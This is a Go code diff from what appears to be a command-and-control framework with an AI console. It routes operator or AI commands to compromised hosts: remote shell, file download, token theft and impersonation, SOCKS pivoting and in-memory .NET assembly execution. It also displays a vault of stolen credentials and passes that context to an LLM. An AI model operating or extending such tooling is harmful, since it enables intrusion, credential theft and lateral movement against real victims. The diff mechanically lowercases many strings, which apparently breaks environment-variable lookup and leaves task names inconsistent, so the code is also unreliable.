@@ -399,7 +399,7 @@ func (s *aiGUISession) execCmd(cmdLine string) string {
 		}
 
 		out1 := execLocalTool(uploadCmd)
-		if strings.Contains(strings.ToLower(out1), "error") && !strings.Contains(out1, "SUCCEED") {
+		if strings.Contains(strings.ToLower(out1), "error") && !strings.Contains(out1, "succeed") {
 			return fmt.Sprintf("[upload result]\n%s", out1)
 		}
 		// Small delay to ensure file is written before execution
@@ -450,7 +450,7 @@ func (s *aiGUISession) execCmd(cmdLine string) string {
 	if s.agentID != "" {
 		switch cmd {
 		case "shell":
-			return s.execAgent("SHELL", strings.Join(args, " "))
+			return s.execAgent("shell", strings.Join(args, " "))
 		case "ls":
 			path := ""
 			if len(args) > 0 {
@@ -458,49 +458,49 @@ func (s *aiGUISession) execCmd(cmdLine string) string {
 			}
 			return s.execAgent("LS", path)
 		case "pwd":
-			return s.execAgent("PWD", "")
+			return s.execAgent("pwd", "")
 		case "cd":
 			return s.execAgent("CD", strings.Join(args, " "))
 		case "cat":
-			return s.execAgent("CAT", strings.Join(args, " "))
+			return s.execAgent("cat", strings.Join(args, " "))
 		case "ps":
 			return s.execAgent("PS", "")
 		case "env":
-			return s.execAgent("ENV", "")
+			return s.execAgent("env", "")
 		case "mkdir":
-			return s.execAgent("MKDIR", strings.Join(args, " "))
+			return s.execAgent("mkdir", strings.Join(args, " "))
 		case "rm":
 			return s.execAgent("RM", strings.Join(args, " "))
 		case "download":
 			if len(args) == 0 {
 				return "[error: download <path>]"
 			}
-			return s.execAgent("DOWNLOAD", fmt.Sprintf(`{"path":%q}`, args[0]))
+			return s.execAgent("download", fmt.Sprintf(`{"path":%q}`, args[0]))
 		case "token":
 			if len(args) == 0 {
 				return "[error: token whoami|steal|make|drop]"
 			}
 			switch args[0] {
 			case "whoami":
-				return s.execAgent("TOKEN_WHOAMI", "")
+				return s.execAgent("token_whoami", "")
 			case "steal":
 				if len(args) < 2 {
 					return "[error: token steal <pid>]"
 				}
-				return s.execAgent("TOKEN_STEAL", args[1])
+				return s.execAgent("token_steal", args[1])
 			case "make":
 				if len(args) < 3 {
 					return "[error: token make <user> <pass>]"
 				}
-				return s.execAgent("TOKEN_MAKE", args[1]+" "+args[2])
+				return s.execAgent("token_make", args[1]+" "+args[2])
 			case "drop":
-				return s.execAgent("TOKEN_DROP", "")
+				return s.execAgent("token_drop", "")
 			}
 		case "socks":
 			if len(args) == 0 {
 				return "[error: socks <port>]"
 			}
-			return s.execAgent("SOCKS_START", args[0])
+			return s.execAgent("socks_start", args[0])
 		case "dotnet-exec":
 			if len(args) == 0 {
 				return "[error: dotnet-exec <assembly.exe> [args...]]"
@@ -521,7 +521,7 @@ func (s *aiGUISession) execCmd(cmdLine string) string {
 			asmB64 := base64.StdEncoding.EncodeToString(asmData)
 			taskArgs := fmt.Sprintf(`{"asm":%q,"args":%q,"type":"","method":""}`,
 				asmB64, strings.Join(asmArgs, " "))
-			return s.execAgent("DOTNET_EXEC", taskArgs)
+			return s.execAgent("dotnet_exec", taskArgs)
 		}
 	}
 
@@ -558,7 +558,7 @@ func (s *aiGUISession) run(target, domain, model, ollamaURL, provider, apiKey st
 			if a.ID == s.agentID {
 				priv := "user"
 				if a.IsAdmin {
-					priv = "ADMIN"
+					priv = "admin"
 				}
 				agentNote = fmt.Sprintf("Active agent: %s@%s [%s] (ID: %s, transport: %s)",
 					a.Username, a.Hostname, priv, s.agentID[:8], a.Transport)
@@ -748,7 +748,7 @@ func (s *aiGUISession) ctxAgents(agents []*server.Agent) string {
 	}
 	var sb strings.Builder
 	fmt.Fprintf(&sb, "%-8s  %-15s  %-20s  %-15s  %-6s  %-8s  %-7s  %s\n",
-		"ID", "HOSTNAME", "USER", "IP", "TRANSP", "OS", "ADMIN", "STATUS")
+		"ID", "hostname", "user", "IP", "transp", "OS", "admin", "status")
 	for _, a := range agents {
 		id := a.ID
 		if len(id) > 8 {
@@ -760,7 +760,7 @@ func (s *aiGUISession) ctxAgents(agents []*server.Agent) string {
 		}
 		admin := "no"
 		if a.IsAdmin {
-			admin = "YES"
+			admin = "yes"
 		}
 		osName := a.OS
 		if osName == "" {
@@ -790,7 +790,7 @@ func (s *aiGUISession) ctxCreds() string {
 		return "No credentials in vault."
 	}
 	var sb strings.Builder
-	fmt.Fprintf(&sb, "%-8s  %-20s  %-20s  %-40s  %s\n", "TYPE", "DOMAIN\\USER", "HOST", "SECRET", "SOURCE")
+	fmt.Fprintf(&sb, "%-8s  %-20s  %-20s  %-40s  %s\n", "type", "DOMAIN\\USER", "host", "secret", "source")
 	for _, c := range creds {
 		user := c.Username
 		if c.Domain != "" {
@@ -816,7 +816,7 @@ func (s *aiGUISession) ctxJobs() string {
 		return "No active listeners."
 	}
 	var sb strings.Builder
-	fmt.Fprintf(&sb, "%-4s  %-10s  %-6s  %s\n", "ID", "PROTO", "PORT", "STATUS")
+	fmt.Fprintf(&sb, "%-4s  %-10s  %-6s  %s\n", "ID", "proto", "port", "status")
 	for _, j := range jobs {
 		fmt.Fprintf(&sb, "%-4d  %-10s  %-6d  %s\n", j.ID, j.Protocol, j.Port, j.Status)
 	}
@@ -841,7 +841,7 @@ func (s *aiGUISession) ctxTargets() string {
 		return ""
 	}
 	var sb strings.Builder
-	fmt.Fprintf(&sb, "%-16s  %-20s  %-12s  %-10s  %s\n", "IP", "HOSTNAME", "OS", "STATUS", "NOTES/TAGS")
+	fmt.Fprintf(&sb, "%-16s  %-20s  %-12s  %-10s  %s\n", "IP", "hostname", "OS", "status", "NOTES/TAGS")
 	for _, t := range targets {
 		info := t.Tags
 		if t.Notes != "" {
@@ -1081,7 +1081,7 @@ func (p *guiProxy) handleClaudeAuth(w http.ResponseWriter, r *http.Request) {
 // request; otherwise the backend falls back to OPENAI_API_KEY or Codex OAuth.
 func (p *guiProxy) handleOpenAIAuth(w http.ResponseWriter, r *http.Request) {
 	w.Header().Set("Content-Type", "application/json")
-	if strings.TrimSpace(os.Getenv("OPENAI_API_KEY")) != "" {
+	if strings.TrimSpace(os.Getenv("openai_api_key")) != "" {
 		json.NewEncoder(w).Encode(map[string]any{
 			"available": true, "mode": "api-key", "api_key_env": true,
 		})
@@ -1128,7 +1128,7 @@ func (p *guiProxy) handleOpenAIModels(w http.ResponseWriter, r *http.Request) {
 		"models":        models,
 		"default_model": defaultModel,
 		"source": func() string {
-			if strings.TrimSpace(req.APIKey) != "" || strings.TrimSpace(os.Getenv("OPENAI_API_KEY")) != "" {
+			if strings.TrimSpace(req.APIKey) != "" || strings.TrimSpace(os.Getenv("openai_api_key")) != "" {
 				return "openai-api"
 			}
 			return "codex-cache"
@@ -1174,7 +1174,7 @@ func (p *guiProxy) handleAIC2Context(w http.ResponseWriter, r *http.Request) {
 		sb.WriteString("  none\n")
 	} else {
 		fmt.Fprintf(&sb, "  %-8s  %-16s  %-20s  %-15s  %-8s  %-7s  %-6s  %s\n",
-			"ID", "HOSTNAME", "USER", "IP", "OS", "ADMIN", "TRANSP", "STATUS")
+			"ID", "hostname", "user", "IP", "OS", "admin", "transp", "status")
 		for _, a := range agentList {
 			id := a.ID
 			if len(id) > 8 {
@@ -1186,7 +1186,7 @@ func (p *guiProxy) handleAIC2Context(w http.ResponseWriter, r *http.Request) {
 			}
 			admin := "no"
 			if a.IsAdmin {
-				admin = "YES"
+				admin = "yes"
 			}
 			osName := a.OS
 			if osName == "" {
@@ -1207,7 +1207,7 @@ func (p *guiProxy) handleAIC2Context(w http.ResponseWriter, r *http.Request) {
 	if len(jobs) == 0 {
 		sb.WriteString("  none\n")
 	} else {
-		fmt.Fprintf(&sb, "  %-4s  %-10s  %-6s  %s\n", "ID", "PROTO", "PORT", "STATUS")
+		fmt.Fprintf(&sb, "  %-4s  %-10s  %-6s  %s\n", "ID", "proto", "port", "status")
 		for _, j := range jobs {
 			fmt.Fprintf(&sb, "  %-4d  %-10s  %-6d  %s\n", j.ID, j.Protocol, j.Port, j.Status)
 		}
@@ -1231,7 +1231,7 @@ func (p *guiProxy) handleAIC2Context(w http.ResponseWriter, r *http.Request) {
 	if len(creds) == 0 {
 		sb.WriteString("  none\n")
 	} else {
-		fmt.Fprintf(&sb, "  %-8s  %-30s  %-15s  %-40s  %s\n", "TYPE", "DOMAIN\\USER", "HOST", "SECRET", "SOURCE")
+		fmt.Fprintf(&sb, "  %-8s  %-30s  %-15s  %-40s  %s\n", "type", "DOMAIN\\USER", "host", "secret", "source")
 		for _, c := range creds {
 			user := c.Username
 			if c.Domain != "" {
@@ -1263,7 +1263,7 @@ func (p *guiProxy) handleAIC2Context(w http.ResponseWriter, r *http.Request) {
 	if len(targets) == 0 {
 		sb.WriteString("  none\n")
 	} else {
-		fmt.Fprintf(&sb, "  %-16s  %-20s  %-12s  %-10s  %s\n", "IP", "HOSTNAME", "OS", "STATUS", "NOTES/TAGS")
+		fmt.Fprintf(&sb, "  %-16s  %-20s  %-12s  %-10s  %s\n", "IP", "hostname", "OS", "status", "NOTES/TAGS")
 		for _, t := range targets {
 			info := t.Tags
 			if t.Notes != "" {
@@ -1472,8 +1472,8 @@ func (p *guiProxy) handleAIConsoleTask(w http.ResponseWriter, r *http.Request) {
 
 	// DOTNET_EXEC / DOTNET-EXEC: AI may send plain "SharpUp.exe audit" as args.
 	// Build proper JSON if args is not already valid JSON.
-	if req.Type == "DOTNET-EXEC" || req.Type == "DOTNET_EXEC" {
-		req.Type = "DOTNET_EXEC"
+	if req.Type == "DOTNET-EXEC" || req.Type == "dotnet_exec" {
+		req.Type = "dotnet_exec"
 		if !json.Valid([]byte(req.Args)) {
 			asmFile, asmArgs := shellFirstToken(req.Args)
 			if !strings.ContainsAny(asmFile, "/\\") {
